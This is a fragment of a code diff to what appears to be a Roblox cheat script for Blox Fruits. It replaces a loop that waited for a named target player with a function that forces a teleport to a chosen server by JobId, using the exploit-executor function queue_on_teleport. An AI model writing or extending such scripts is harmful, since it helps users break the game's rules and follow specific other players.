+    end)
+    
+    -- AUTO-SHOW GUI WHEN TELEPORTED
+    print("Command GUI loaded successfully!")
 end
 
--- Main execution
-task.spawn(function()
-    -- Wait for everything to load
-    task.wait(2)
-    
-    -- Create UI
-    createCommandUI()
-    
-    -- Setup auto-sit
-    setupAutoSit()
-    
-    print("[Script Lynx TP] System ready! UI created.")
-    
-    -- Find target
-    local target = Players:FindFirstChild(TARGET_USERNAME)
-    if target then
-        print("[Script Lynx TP] Target found:", target.Name)
-    else
-        print("[Script Lynx TP] Waiting for target to join...")
+-- Main teleport function
+local function teleportToServer()
+    local TARGET_PLACE = SEA_PLACE[TARGET_SEA]
+    if not TARGET_PLACE then
+        Players.LocalPlayer:Kick("Invalid SEA config!")
+        return
     end
-end)
+    
+    if not JOBID or JOBID == "" then
+        Players.LocalPlayer:Kick("Invalid or missing JobId!")
+        return
+    end
+    
+    local CURRENT_SEA = getCurrentSea()
+    
+    -- Queue for reconnection
+    queue_on_teleport(string.format([[
+        task.wait(4)
+        if game.PlaceId == %s and game.JobId ~= "%s" then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")
+        end
+    ]], TARGET_PLACE, JOBID, TARGET_PLACE, JOBID))
+    
+    -- Handle SEA travel
+    if CURRENT_SEA ~= TARGET_SEA then
+        if CURRENT_SEA == "1" then
+            CommF:InvokeServer("TravelDressrosa")
+            return
+        end
+        
+        if CURRENT_SEA == "2" and TARGET_SEA == "3" then
+            CommF:InvokeServer("TravelZou")
+            return
+        end
+    end
+    
+    -- Direct teleport if already in correct SEA
+    if game.PlaceId == TARGET_PLACE and game.JobId ~= JOBID then
+        TeleportService:TeleportToPlaceInstance(TARGET_PLACE, JOBID)
+    end
+end
 
-print("[Script Lynx TP] Loaded successfully!")
+-- AUTO-SHOW GUI AFTER TELEPORT
+task.wait(5) -- Wait for game to load
+createCommandGUI()
